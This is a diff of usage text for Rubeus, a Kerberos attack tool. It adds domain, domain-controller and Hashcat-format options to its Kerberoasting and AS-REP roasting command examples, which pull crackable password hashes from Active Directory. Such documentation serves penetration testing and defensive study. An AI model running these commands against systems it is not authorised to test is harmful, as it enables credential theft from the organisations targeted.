@@ -76,19 +76,19 @@ Ticket extraction and harvesting:
 Roasting:
 
     Perform Kerberoasting:
-        Rubeus.exe kerberoast [/spn:""blah/blah""] [/user:USER] [/ou:""OU,...""]
+        Rubeus.exe kerberoast [/spn:""blah/blah""] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""]
 
     Perform Kerberoasting, outputting hashes to a file:
-        Rubeus.exe kerberoast /outfile:hashes.txt [/spn:""blah/blah""] [/user:USER] [/ou:""OU,...""]
+        Rubeus.exe kerberoast /outfile:hashes.txt [/spn:""blah/blah""] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""]
 
     Perform Kerberoasting with alternate credentials:
-        Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:""blah/blah""] [/user:USER] [/ou:""OU,...""]
+        Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:""blah/blah""] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""]
 
     Perform AS-REP ""roasting"" for any users without preauth:
-        Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU,...""]
+        Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""]
 
-    Perform AS-REP ""roasting"" for any users without preauth, outputting hashes to a file:
-        Rubeus.exe asreproast /outfile:hashes.txt [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU,...""]
+    Perform AS-REP ""roasting"" for any users without preauth, outputting Hashcat format to a file:
+        Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""]
 
     Perform AS-REP ""roasting"" for any users without preauth using alternate credentials:
         Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU,...""]
